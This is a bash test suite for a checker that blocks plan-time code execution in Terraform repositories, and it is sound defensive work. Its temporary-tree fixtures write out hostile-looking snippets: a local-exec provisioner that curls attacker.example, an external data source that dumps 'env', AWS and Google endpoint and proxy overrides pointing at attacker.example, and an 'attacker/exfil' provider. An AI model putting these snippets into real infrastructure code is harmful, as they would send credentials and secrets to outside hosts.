#!/usr/bin/env bash
# Tests for scripts/check-plan-time-exec.py against temp trees (attack corpus).
#   bash scripts/tests/test-check-plan-time-exec.sh   (make test-scripts)
# Needs python-hcl2 (.github/requirements/hcl2.txt). The checker reads its
# allowlists from policies/opa/ of THIS repo, so these cases also prove that
# the .rego parsing works.
set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
SCRIPT="${REPO_ROOT}/scripts/check-plan-time-exec.py"
workdir="$(mktemp -d)"
trap 'rm -rf "${workdir}"' EXIT

failures=0
ok() { printf '  ok   %s\n' "$1"; }
bad() { failures=$((failures + 1)); printf '  FAIL %s\n' "$1" >&2; }

# add_file <tree> <relative file> <content>
add_file() {
  mkdir -p "$1/$(dirname "$2")"
  printf '%s\n' "$3" >"$1/$2"
}

# case_tree <name> <relative file> <content>: one file in an otherwise empty tree.
case_tree() {
  local t="${workdir}/$1"
  add_file "${t}" "$2" "$3"
  echo "${t}"
}

# expect_rc <label> <rc> <tree> [<text the output must contain>]
expect_rc() {
  local rc=0
  PLAN_EXEC_ROOT="$3" python3 "${SCRIPT}" >"${workdir}/out" 2>&1 || rc=$?
  if [ "${rc}" -ne "$2" ]; then
    bad "$1 (rc=${rc}, want $2)"
    cat "${workdir}/out" >&2
  elif [ -n "${4:-}" ] && ! grep -qF -- "$4" "${workdir}/out"; then
    bad "$1 (output lacks: $4)"
    cat "${workdir}/out" >&2
  else
    ok "$1"
  fi
}

PROV='resource "terraform_data" "x" {
  provisioner "local-exec" {
    command = "id"
  }
}'

# --- provisioners -----------------------------------------------------------
expect_rc "clean module passes" 0 "$(case_tree clean modules/a/main.tf 'resource "aws_s3_bucket" "b" {
  bucket = "x"
}')"
expect_rc "bare-label provisioner fails" 1 "$(case_tree bare modules/a/main.tf 'resource terraform_data x {
  provisioner local-exec {
    command = "curl https://attacker.example"
  }
}')" "provisioner"
expect_rc "quoted provisioner fails" 1 "$(case_tree quoted envs/r/main.tf "${PROV}")" "provisioner"
expect_rc "removed-block destroy provisioner fails" 1 "$(case_tree removed envs/r/main.tf 'removed {
  from = terraform_data.z
  provisioner "local-exec" {
    when    = destroy
    command = "id"
  }
}')" "removed block"
expect_rc "removed-block provisioner fails even in vault-secrets" 1 "$(case_tree removedvs modules/supabase/vault-secrets/main.tf 'removed {
  from = terraform_data.z
  provisioner "local-exec" {
    when    = destroy
    command = "id"
  }
}')" "removed block"
expect_rc "tf.json provisioner fails" 1 "$(case_tree json modules/a/main.tf.json '{"//": "comment", "resource": {"terraform_data": {"x": {"provisioner": [{"local-exec": {"command": "id"}}]}}}}')" "provisioner"
expect_rc "allowlisted vault-secrets module keeps its provisioner" 0 "$(case_tree allow modules/supabase/vault-secrets/main.tf 'resource "terraform_data" "bootstrap" {
  provisioner "local-exec" {
    command = "npm ci"
  }
}')"
expect_rc "look-alike path is not allowlisted" 1 "$(case_tree look modules/evil/supabase/vault-secrets/main.tf "${PROV}")" "provisioner"
expect_rc "e2e fixture keeps its settle provisioner" 0 "$(case_tree e2eok tests/e2e/aws/main.tf 'resource "terraform_data" "archive_settle" {
  provisioner "local-exec" {
    command = "sleep 20"
  }
}')"
expect_rc "e2e fixture: another resource's provisioner fails" 1 "$(case_tree e2ebad tests/e2e/aws/main.tf "${PROV}")" "provisioner"
expect_rc "a file outside the usual folders is scanned" 1 "$(case_tree outside evil/main.tf "${PROV}")" "evil/main.tf"
expect_rc ".terraform is skipped" 0 "$(case_tree dotterraform modules/a/.terraform/modules/m/main.tf "${PROV}")"

# --- external / http data and remote state -------------------------------------
expect_rc "bare-label external data fails" 1 "$(case_tree ext modules/a/main.tf 'data external x {
  program = ["sh", "-c", "env"]
}')" 'data "external"'
expect_rc "tf.json external data fails" 1 "$(case_tree jsondata modules/a/x.tf.json '{"data": {"external": {"x": {"program": ["sh", "-c", "env"]}}}}')" 'data "external"'
expect_rc "check-scoped http data fails" 1 "$(case_tree check modules/a/main.tf 'check "c" {
  data "http" "y" {
    url = "https://attacker.example"
  }
  assert {
    condition     = true
    error_message = "x"
  }
}')" 'data "http"'
expect_rc "remote state with an http backend fails" 1 "$(case_tree rshttp envs/r/main.tf 'data "terraform_remote_state" "x" {
  backend = "http"
  config = {
    address = "https://attacker.example"
  }
}')" "terraform_remote_state"
expect_rc "remote state backend from a variable fails" 1 "$(case_tree rsvar envs/r/main.tf 'data "terraform_remote_state" "x" {
  backend = var.backend
}')" "terraform_remote_state"
expect_rc "remote state with the cloud backend passes" 0 "$(case_tree rsok envs/r/main.tf 'data "terraform_remote_state" "x" {
  backend = "cloud"
  config = {
    organization = "o"
  }
}')"

# --- providers ----------------------------------------------------------------
expect_rc "registry-qualified external provider fails" 1 "$(case_tree fq modules/a/versions.tf 'terraform {
  required_providers {
    e = { source = "registry.terraform.io/hashicorp/external" }
  }
}')" "hashicorp/external"
expect_rc "mixed-case qualified source fails" 1 "$(case_tree mixed modules/a/versions.tf 'terraform {
  required_providers {
    e = { source = "Registry.Terraform.IO/HashiCorp/External" }
  }
}')" "hashicorp/external"
expect_rc "third-party provider fails" 1 "$(case_tree third modules/a/versions.tf 'terraform {
  required_providers {
    x = { source = "attacker/exfil" }
  }
}')" "attacker/exfil"
expect_rc "local name aws mapped to a third-party source fails" 1 "$(case_tree remap modules/a/versions.tf 'terraform {
  required_providers {
    aws = { source = "attacker/aws" }
  }
}')" "attacker/aws"
expect_rc "version-only implied provider fails" 1 "$(case_tree implied modules/a/versions.tf 'terraform {
  required_providers {
    http = "~> 3.0"
  }
}')" "hashicorp/http"
expect_rc "allowed qualified provider passes" 0 "$(case_tree okfq modules/a/versions.tf 'terraform {
  required_providers {
    aws = { source = "registry.terraform.io/hashicorp/aws", version = ">= 6.46.0, < 7.0.0" }
  }
}')"
expect_rc "unlisted resource type prefix fails" 1 "$(case_tree prefix modules/a/main.tf 'resource "dns_a_record_set" "x" {
  name = "x"
}')" "hashicorp/dns"
expect_rc "provider block of an undeclared provider fails" 1 "$(case_tree provblock envs/r/providers.tf 'provider "dns" {}')" "hashicorp/dns"
expect_rc "action block of an unlisted provider fails" 1 "$(case_tree action modules/a/main.tf 'action "local_command" "x" {
  config {
    command = "id"
  }
}')" "hashicorp/local"

# --- endpoint, proxy and TLS overrides ------------------------------------------
expect_rc "aws endpoints override fails" 1 "$(case_tree endpoints envs/r/providers.tf 'provider "aws" {
  endpoints {
    sts = "https://attacker.example"
  }
}')" '"endpoints"'
expect_rc "dynamic endpoints block fails" 1 "$(case_tree dynendpoints envs/r/providers.tf 'provider "aws" {
  dynamic "endpoints" {
    for_each = [1]
    content {
      sts = "https://attacker.example"
    }
  }
}')" '"endpoints"'
expect_rc "google custom endpoint fails" 1 "$(case_tree gce envs/r/providers.tf 'provider "google" {
  secret_manager_custom_endpoint = "https://attacker.example/"
}')" "secret_manager_custom_endpoint"
expect_rc "tfe hostname fails" 1 "$(case_tree tfeh envs/r/providers.tf 'provider "tfe" {
  hostname = "attacker.example"
}')" '"hostname"'
expect_rc "tf.json provider proxy fails" 1 "$(case_tree jsonprov envs/r/providers.tf.json '{"provider": {"aws": [{"region": "eu-west-2"}, {"alias": "b", "https_proxy": "http://attacker.example"}]}}')" "https_proxy"
expect_rc "fips switch passes" 0 "$(case_tree fips envs/r/providers.tf 'provider "aws" {
  use_fips_endpoint = true
}')"

# --- module sources -------------------------------------------------------------
expect_rc "git module source fails" 1 "$(case_tree gitmod envs/r/main.tf 'module "m" {
  source = "git::https://attacker.example/x.git//supabase/vault-secrets"
}')" "git::https://attacker.example"
expect_rc "registry module source fails" 1 "$(case_tree regmod envs/r/main.tf 'module "m" {
  source  = "terraform-aws-modules/vpc/aws"
  version = "6.0.0"
}')" "terraform-aws-modules/vpc/aws"
expect_rc "own release module passes" 0 "$(case_tree ownmod examples/r/main.tf 'module "m" {
  source = "git::https://github.com/EdwinKassier/Ashes-Devops-Tools.git//modules/aws/stages/security?ref=v0.1.0"
}')"

# --- the OPA provisioner chain must exist in the code --------------------------
t="${workdir}/chainok"
add_file "${t}" envs/saas/main.tf 'module "saas_workload" {
  source = "../../modules/saas/stages/saas-workload"
}'
add_file "${t}" modules/saas/stages/saas-workload/main.tf 'module "vault_secrets" {
  source = "../../../supabase/vault-secrets"
}'
add_file "${t}" modules/supabase/vault-secrets/main.tf 'resource "terraform_data" "bootstrap" {
  provisioner "local-exec" {
    command = "npm ci"
  }
}'
expect_rc "the OPA provisioner chain matches the code" 0 "${t}"
t="${workdir}/chaindrift"
add_file "${t}" envs/saas/main.tf 'module "saas_workload" {
  source = "../../modules/saas/stages/saas-workload"
}'
add_file "${t}" modules/saas/stages/saas-workload/main.tf 'module "vault" {
  source = "../../../supabase/vault-secrets"
}'
expect_rc "a renamed call in the provisioner chain fails" 1 "${t}" "allowed_provisioner_chain"

# --- parse failures fail closed (no fallback parse) ------------------------------
# python-hcl2 7.3.1 rejects a line that starts with ? or : inside parentheses.
# There is no retry: a retry that joined such lines let a heredoc closing line
# swallow the blocks after it.
expect_rc "leading-operator conditional fails closed" 1 "$(case_tree leadop envs/r/main.tf 'locals {
  x = (
    var.a
    ? "b"
    : "c"
  )
}')" "cannot parse"
expect_rc "heredoc with a leading-operator line cannot hide a provisioner" 1 "$(case_tree heredoc envs/r/main.tf 'locals {
  x = (
    var.a
    ? <<EOT
text
EOT
    : "c"
  )
}
resource "terraform_data" "x" {
  provisioner "local-exec" {
    command = "id"
  }
}')"
expect_rc "heredoc body line that starts with : is not joined" 1 "$(case_tree heredoc2 envs/r/main.tf 'locals {
  s = <<EOT
a
EOT
}
resource "terraform_data" "x" {
  provisioner "local-exec" {
    command = <<CMD
: start
CMD
  }
}')" "provisioner"
expect_rc "duplicate tf.json key cannot hide a provisioner" 1 "$(case_tree jsondup modules/a/main.tf.json '{"resource": {"terraform_data": {"x": {"provisioner": [{"local-exec": {"command": "id"}}]}}}, "resource": {"aws_s3_bucket": {"b": {"bucket": "x"}}}}')" "duplicate JSON key"
expect_rc "duplicate nested tf.json key fails closed" 1 "$(case_tree jsondup2 envs/r/p.tf.json '{"provider": {"aws": {"region": "eu-west-2", "region": "us-east-1"}}}')" "duplicate JSON key"

# --- tracked files (git mode) ----------------------------------------------------
# git_tree <name>: a git work tree with every file staged (ls-files reads the index).
git_tree() {
  git -C "$1" init -q
  git -C "$1" add -A
}
t="${workdir}/gitok"
add_file "${t}" modules/a/main.tf 'resource "aws_s3_bucket" "b" {
  bucket = "x"
}'
add_file "${t}" untracked-later.txt 'x'
git_tree "${t}"
add_file "${t}" evil/main.tf "${PROV}"
expect_rc "git mode passes a clean tree and skips untracked files" 0 "${t}"
t="${workdir}/gitsymlink"
add_file "${t}" elsewhere/main.tf "${PROV}"
mkdir -p "${t}/modules"
ln -s ../elsewhere "${t}/modules/link"
git_tree "${t}"
git -C "${t}" rm -q --cached elsewhere/main.tf
expect_rc "a tracked symlink fails" 1 "${t}" "tracked symlink"
t="${workdir}/gitnodemodules"
add_file "${t}" modules/a/node_modules/x/main.tf "${PROV}"
git_tree "${t}"
git -C "${t}" add -f modules/a/node_modules/x/main.tf
expect_rc "a tracked file under node_modules fails" 1 "${t}" "node_modules"
t="${workdir}/gitdotterraform"
add_file "${t}" envs/r/.terraform/modules/m/main.tf "${PROV}"
git_tree "${t}"
git -C "${t}" add -f envs/r/.terraform/modules/m/main.tf
expect_rc "a tracked file under .terraform fails" 1 "${t}" ".terraform"
expect_rc "a local module source into node_modules fails" 1 "$(case_tree modnm envs/r/main.tf 'module "m" {
  source = "./node_modules/x"
}')" "node_modules"
expect_rc "a local module source into .terraform fails" 1 "$(case_tree moddt envs/r/main.tf 'module "m" {
  source = "../../.terraform/modules/x"
}')" ".terraform"

# --- mutations the first suite did not catch -----------------------------------
expect_rc "aws_lambda_invocation data fails" 1 "$(case_tree lambda modules/a/main.tf 'data "aws_lambda_invocation" "x" {
  function_name = "f"
  input         = "{}"
}')" 'data "aws_lambda_invocation"'
expect_rc "aws_lambda_invoke action fails" 1 "$(case_tree lambdaact modules/a/main.tf 'action "aws_lambda_invoke" "x" {
  config {
    function_name = "f"
  }
}')" "allowed_action_types"
expect_rc "interpolated remote-state backend fails" 1 "$(case_tree rsinterp envs/r/main.tf 'data "terraform_remote_state" "x" {
  backend = "${"cloud"}"
}')" "terraform_remote_state"
expect_rc "remote state with the remote backend passes" 0 "$(case_tree rsremote envs/r/main.tf 'data "terraform_remote_state" "x" {
  backend = "remote"
}')"
expect_rc "a provisioner nested in another block is found" 1 "$(case_tree nested modules/a/main.tf 'resource "terraform_data" "x" {
  dynamic "provisioner" {
    for_each = [1]
    content {}
  }
}')" "provisioner"
expect_rc "a sub-folder of vault-secrets is not the reviewed module" 1 "$(case_tree vssub modules/supabase/vault-secrets/sub/main.tf "${PROV}")" "provisioner"
expect_rc "an ephemeral block of an unlisted provider fails" 1 "$(case_tree eph modules/a/main.tf 'ephemeral "vault_kv_secret" "x" {
  path = "x"
}')" "hashicorp/vault"
expect_rc "an ephemeral block of an allowed provider passes" 0 "$(case_tree ephok modules/a/main.tf 'ephemeral "random_password" "x" {
  length = 20
}')"
expect_rc "the provider argument decides the provider" 1 "$(case_tree provarg modules/a/main.tf 'resource "aws_s3_bucket" "b" {
  provider = dns
  bucket   = "x"
}')" "hashicorp/dns"
expect_rc "an aliased allowed provider argument passes" 0 "$(case_tree provalias modules/a/main.tf 'resource "aws_s3_bucket" "b" {
  provider = aws.west
  bucket   = "x"
}')"
t="${workdir}/scope"
add_file "${t}" modules/a/versions.tf 'terraform {
  required_providers {
    dns = { source = "hashicorp/aws" }
  }
}'
add_file "${t}" modules/b/main.tf 'resource "dns_a_record_set" "x" {
  name = "x"
}'
expect_rc "required_providers apply to their own folder only" 1 "${t}" "modules/b/main.tf"
expect_rc "a tf.json comment key is skipped" 0 "$(case_tree jsoncomment modules/a/versions.tf.json '{"terraform": {"required_providers": {"//": "pinned by Renovate", "aws": {"source": "hashicorp/aws"}}}}')"
for src in \
  'git::https://github.com/EdwinKassier/Ashes-Devops-Tools.git//modules/aws/stages/security?ref=v0.1.0&depth=1' \
  'git::https://github.com/EdwinKassier/Ashes-Devops-Tools.git//modules/aws/stages/security?ref=v0.1.0-evil' \
  'git::https://github.com/EdwinKassier/Ashes-Devops-Tools.git//modules/aws/stages/security?ref=main' \
  'git::https://github.com/EdwinKassier/Ashes-Devops-Tools.git//modules/../../x?ref=v0.1.0' \
  'git::https://github.com/EdwinKassier/Ashes-Devops-Tools.git-evil//modules/aws?ref=v0.1.0' \
  '..evil/x' \
  '.evil/x'; do
  expect_rc "module source ${src} fails" 1 "$(case_tree "mod$(printf '%s' "${src}" | cksum | cut -d' ' -f1)" envs/r/main.tf "module \"m\" {
  source = \"${src}\"
}")" "neither local nor"
done

# --- the .rego reader accepts only string literals ------------------------------
# policy_copy <name>: a copy of the policy files (not the tests) to mutate.
policy_copy() {
  local d="${workdir}/$1"
  mkdir -p "${d}"
  cp "${REPO_ROOT}/policies/opa/no_plan_time_code_execution.rego" \
    "${REPO_ROOT}/policies/opa/no_plan_time_code_execution_allowlist.rego" "${d}/"
  echo "${d}"
}
# expect_policy_rc <label> <rc> <policy dir> <text>
expect_policy_rc() {
  local rc=0
  PLAN_EXEC_POLICY_DIR="$3" PLAN_EXEC_ROOT="${workdir}/clean" python3 "${SCRIPT}" >"${workdir}/out" 2>&1 || rc=$?
  if [ "${rc}" -eq "$2" ] && grep -qF -- "$4" "${workdir}/out"; then ok "$1"; else
    bad "$1 (rc=${rc}, want $2 with: $4)"
    cat "${workdir}/out" >&2
  fi
}
d="$(policy_copy polok)"
expect_policy_rc "an unchanged policy copy is read" 0 "${d}" "0 problem(s)"
d="$(policy_copy polcomp)"
python3 - "${d}/no_plan_time_code_execution_allowlist.rego" <<'PY'
import re, sys
p = sys.argv[1]
s = open(p).read()
s = re.sub(r"allowed_provider_sources := \{.*?\n\}", 'allowed_provider_sources := {x | some x in ["registry.terraform.io/attacker/exfil"]}', s, flags=re.S)
open(p, "w").write(s)
PY
expect_policy_rc "a comprehension in an allowlist exits 2" 2 "${d}" "string literals"
d="$(policy_copy polexpr)"
sed -i.bak 's/^allowed_remote_state_backends := .*/allowed_remote_state_backends := {"cloud"} | {"http"}/' "${d}/no_plan_time_code_execution_allowlist.rego"
expect_policy_rc "a set expression in an allowlist exits 2" 2 "${d}" "string literals"
d="$(policy_copy poltwice)"
printf '\nallowed_provider_sources contains "registry.terraform.io/attacker/exfil"\n' >"${d}/extra.rego.tmp"
{ printf 'package terraform.policies.no_plan_time_code_execution\n'; cat "${d}/extra.rego.tmp"; } >"${d}/extra.rego"
expect_policy_rc "a second definition in the package exits 2" 2 "${d}" "defined 2 times"

# --- fail closed -----------------------------------------------------------------
expect_rc "unparseable file fails closed" 1 "$(case_tree broken modules/a/main.tf 'resource "x" {')" "cannot parse"
expect_rc "unparseable tf.json fails closed" 1 "$(case_tree brokenjson modules/a/main.tf.json '{"resource": ')" "cannot parse"

if [ "${failures}" -ne 0 ]; then
  echo "${failures} failure(s)" >&2
  exit 1
fi
echo "check-plan-time-exec: all cases pass"
